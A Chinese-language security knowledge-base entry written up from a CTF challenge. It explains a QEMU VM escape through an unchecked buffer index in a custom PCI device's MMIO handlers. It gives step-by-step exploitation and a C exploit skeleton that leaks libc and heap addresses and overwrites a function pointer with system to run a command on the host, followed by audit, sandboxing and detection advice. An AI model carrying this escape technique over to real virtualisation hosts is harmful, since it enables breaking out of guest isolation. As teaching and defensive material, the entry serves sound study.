---
id: binary-pwn-sandbox-escape-qemu-pci-mmio-oob-function-pointer-escape
title: QEMU 自定义 PCI 设备 MMIO 越界读写逃逸：改 log_handler 为 system
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: qemu-pci-mmio-oob-function-pointer-escape
tags:
- qemu
- virtualization
- escape
- pci
- mmio
- oob
- function-pointer
- sandbox-escape
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V92
  verified_at: '2026-11-05T19:49:38+08:00'
  notes: 已对照原文核对：ccb-dev-pci(vendor 0x1234/device 0x1337, BAR0 0x800)、MMIO 回调 buffer[index] 无边界检查、offset 0/4/0xC/0x10/0x14 语义、OOB读17/18泄dprintf(-0x60a10)、103/104泄堆、写cat flag(23-25)、覆写handler与字符串槽(17/18、19/20)、触发0xC 均与原文一致；已修正原文'KASLR只影响libc'的表述为guest KASLR/宿主libc ASLR区分。注意：原文引用的wp.assets截图未随抓取提供（img目录为空），仅按文字核对，未能查看调试/flag截图；exp未在本机复跑，索引/偏移为题目特定值；QEMU 3.1.0为题目构建版本，非上游影响区间，未设 affected_versions；frontmatter 无 sources/source_url。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-qemu-pci-mmio-oob-function-pointer-escape/
draft: false
kb_aliases:
- QEMU 虚拟化逃逸
- ccb-dev 设备逃逸
- PCI MMIO 越界读写
- QEMU 设备 OOB
- log_handler 劫持
- dprintf 改 system
- VM escape
---

## 一句话结论

自定义 QEMU PCI 设备 `ccb-dev` 的 BAR0 MMIO 处理函数用 guest 可控的 `index` 直接访问 `buffer[index]`，既不检查上界也不检查下界；guest 映射 `/sys/.../resource0` 后即可越界读写设备状态结构，泄露 libc 与堆地址，把 `log_handler`（初始为 `dprintf`）覆盖为 `system` 并让传入的字符串参数指向 `cat flag`，最后写寄存器 `0xC` 触发 handler 调用，在宿主 qemu 进程中执行命令，完成 VM 到宿主机的逃逸。

## 原理

- **设备模型在宿主用户态运行**：QEMU 的 `memory_region_init_io` 把 guest 的 MMIO 访问分派到 `ccb_dev_mmio_read/write` 回调；这些回调运行在宿主 qemu 进程上下文，因此设备模拟代码的越界读写直接影响宿主进程内存，而不是 guest 内核。
- **设备结构**：`CCBPCIDevState` 含 `buffer[]`、`index`、`log_arg`、`status`、`log_fd`、`log_format`、`log_handler` 等字段；`ccb_dev_realize` 初始化 `log_fd = 2`、`log_handler = dprintf`，并注册 BAR0（0x800 字节）。
- **读寄存器**：offset 0 返回 `index`；offset 4 返回 `buffer[index]`；offset 8 返回 `0xDEADBEEF`；offset 0x10 返回 `log_arg`；offset 0x18 返回 `status`。其中 `buffer[index]` 没有边界检查。
- **写寄存器**：offset 0 设置 `index`（32 位、完全可控）；offset 4 执行 `buffer[index] = val`（同样没有边界检查）；offset 0xC 若 `log_handler` 非空则调用 `log_handler(log_fd, log_format, log_arg)` 并把 `status` 置 `0x10663D`；offset 0x10/0x14 设置 `log_arg`/`log_fd`。
- **OOB 读泄露**：把 `index` 设到 `buffer` 之后的结构字段，按 32 位低/高两半读出 64 位指针。案例中索引 17/18 读出 `log_handler`（libc 的 `dprintf` 地址），减去 `dprintf` 偏移 `0x60a10` 得到 libc base；索引 103/104 读出堆指针，据此计算 `log_format` 指向的缓冲区地址。
- **OOB 写劫持**：把命令字符串 `cat flag` 以小端 32 位块写进设备结构内可控缓冲区（案例索引 23–25），把 `log_handler` 写成 `system`（案例索引 17/18），并把 handler 调用时作为字符串参数使用的槽位指向该命令（案例索引 19/20）。写 offset `0xC` 触发调用后，`dprintf` 风格的 handler 变成 `system`，在宿主执行 `cat flag`。
- **为什么能逃逸**：guest 内的 root（或能访问 PCI resource 的驱动）通过 sysfs `resource0` 映射 BAR0，读写 MMIO 只是普通内存访问；QEMU 设备代码把越界索引当成合法数组下标，最终改写了宿主进程的函数指针。该链不需要 guest 内核漏洞，也不需要绕过 guest 的 KASLR；宿主 libc 的 ASLR 由 OOB 读泄露的 `dprintf` 指针解决。
- **调试要点**：设备在 QEMU 3.1.0 的 `hw/misc/ccb-dev.c` 中；GDB 附加的是宿主 qemu 进程而不是 guest 内核，需按实际执行地址下断（无符号时按偏移/反汇编定位），在 `ccb_dev_mmio_write`、handler 调用点观察结构字段。

## 触发条件

- guest 内可访问自定义 PCI 设备（案例 `-device ccb-dev-pci`，vendor `0x1234`、device `0x1337`，BAR0 0x800）；
- guest 有权限打开并 mmap `/sys/bus/pci/devices/0000:00:04.0/resource0`（通常是 guest root）；
- QEMU 未启用会阻断 mmap/IO 的沙箱策略（如 `-sandbox` 限制、seccomp）；
- 宿主 qemu 进程可执行 `system`（默认 libc 可用），且攻击者能触发 offset 0xC；
- 能通过 OOB 读泄露 libc 与堆地址（或已知目标环境偏移）。

## 利用步骤

1. guest 内 `lspci` 找到 `1234:1337`，确认 `/sys/bus/pci/devices/0000:00:04.0/resource0`。
2. `open(resource0, O_RDWR|O_SYNC)` + `mmap(..., 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0)` 得到 MMIO 基址。
3. 封装 `mmio_read(off)`/`mmio_write(off, val)`；通过 offset 0 设置 `index`，offset 4 读写 `buffer[index]`。
4. 读索引 17/18 得到 `dprintf` 指针，减去 libc 偏移得到 libc base；读索引 103/104 得到堆地址，计算命令缓冲区地址。
5. 把 `cat flag` 按 4 字节小端块写入缓冲区（案例索引 23–25）。
6. 把 `system` 地址写到 `log_handler` 槽位（案例索引 17/18），把命令指针写到 handler 的字符串参数槽位（案例索引 19/20）。
7. 写 offset `0xC` 触发 `log_handler` 调用；宿主 qemu 执行 `cat flag`，flag 通常回显到 guest 串口/宿主 stdout。
8. 调试时把 exp 编译进 initramfs：解包 `core.cpio`、放入静态 exp、`find . | cpio -o -H newc > core_patched.cpio`，修改 `run.sh` 的 `-initrd`，GDB attach 宿主 qemu，在 handler 调用点观察字段。

## PoC

以下为按题解压缩的 guest 侧 exp 骨架（偏移/索引为案例环境，需按目标调整）：

```c
#include <stdint.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>

static unsigned char *bar;
static uint32_t rd(uint64_t off) { return *(volatile uint32_t *)(bar + off); }
static void wr(uint64_t off, uint32_t v) { *(volatile uint32_t *)(bar + off) = v; }

static uint32_t read_idx(uint32_t i) { wr(0, i); return rd(4); }
static void write_idx(uint32_t i, uint32_t v) { wr(0, i); wr(4, v); }
static uint64_t read64(uint32_t i) {
    return ((uint64_t)read_idx(i + 1) << 32) | read_idx(i);
}
static void write64(uint32_t i, uint64_t v) {
    write_idx(i, (uint32_t)v);
    write_idx(i + 1, (uint32_t)(v >> 32));
}

int main(void) {
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (fd < 0) { perror("open"); return 1; }
    bar = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (bar == MAP_FAILED) { perror("mmap"); return 1; }

    /* 1) 泄露 libc：索引 17/18 = log_handler (dprintf) */
    uint64_t dprintf = read64(17);
    uint64_t libc_base = dprintf - 0x60a10;

    /* 2) 泄露堆并计算命令缓冲区 */
    uint64_t heap = read64(103);
    uint64_t cmd_buf = heap + 0xaa0;

    /* 3) 写 "cat flag"（小端 4 字节块） */
    write_idx(23, ' tac');   /* 内存中为 "cat " */
    write_idx(24, 'galf');   /* 内存中为 "flag" */
    write_idx(25, 0);

    /* 4) 覆盖 handler 与参数字符串槽位 */
    write64(19, cmd_buf);                 /* handler 调用时的字符串参数 */
    write64(17, libc_base + 0x50d70);     /* system */

    /* 5) 触发 */
    wr(0xc, 0);
    return 0;
}
```

## 变体与关联

- 变体：PMIO 设备用 `iopl(3)` + `inl/outl` 访问端口；MMIO 设备通过 sysfs `resource0` 映射；两者漏洞模式相同，都是设备回调缺边界检查。
- 变体：其他 QEMU 设备漏洞类型包括 OOB、UAF、整数溢出、DMA 重入、virtio 描述符链错误；利用目标可能是函数指针、定时器、`MemoryRegionOps` 回调或堆对象。
- 变体：开启 QEMU `-sandbox`、seccomp、VM 隔离（KVM/独立进程）会限制或阻断宿主命令执行；利用需先评估沙箱策略。
- 关联：[[binary-pwn-kernel-qemu-initramfs-gdb-workflow]]（QEMU/initramfs 调试工作流）、[[binary-pwn-kernel-ioctl-global-length-oob-read-flag]]（设备/内核 OOB 读）、[[binary-pwn-sandbox-escape-seccomp-write-fd-fcntl-dup2]]（沙箱逃逸中的 seccomp 绕过）。

## 检测与防御

- **设备代码审计**：所有 guest 可控的 index/offset/length 必须做上下界与乘法溢出检查；`MemoryRegionOps` 的 `valid.min_access_size/max_access_size` 与 `impl` 回调要校验访问宽度；数组访问用 `ARRAY_SIZE` 或显式范围判断。
- **QEMU 沙箱**：对外部不可信 guest 启用 `-sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny`，配合 seccomp/namespace 隔离；只暴露必要设备，避免自定义/调试设备。
- **最小权限**：qemu 进程以非 root、独立用户运行；限制其对宿主机文件与命令的访问；使用 `-runas`、cgroup、SELinux/AppArmor。
- **检测**：宿主监控 qemu 进程异常 `execve`/`system`、加载非预期共享库、访问 `/bin/sh`；guest 内监控对 PCI resource0 的异常 mmap 与高频 MMIO；对自定义设备做 fuzz（QEMU 自带 qtest、libFuzzer）。
- **修复**：为 `buffer[index]` 增加 `index < ARRAY_SIZE(buffer)` 检查；对 handler 指针与格式串做完整性保护；升级/重编译 QEMU 并移除不必要的自定义设备。
